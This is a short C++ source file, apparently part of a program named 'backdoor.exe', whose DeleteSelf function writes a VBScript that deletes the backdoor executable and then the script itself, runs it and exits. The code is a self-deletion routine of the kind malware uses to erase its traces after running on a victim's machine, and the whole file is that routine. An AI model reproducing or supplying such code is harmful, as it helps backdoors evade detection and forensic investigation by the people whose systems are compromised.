#include "utilities.h"

void DeleteSelf()
{
	std::ofstream vbsFile("del.vbs");
	vbsFile << "WScript.Sleep(1000)\n"
		"Set f1 = CreateObject(\"Scripting.FileSystemObject\"):f1.DeleteFile \"backdoor.exe\", True\n"
		"Set f2 = CreateObject(\"Scripting.FileSystemObject\"):f2.DeleteFile \"del.vbs\", True";

	vbsFile.close();

	system("start del.vbs");
	exit(0);
}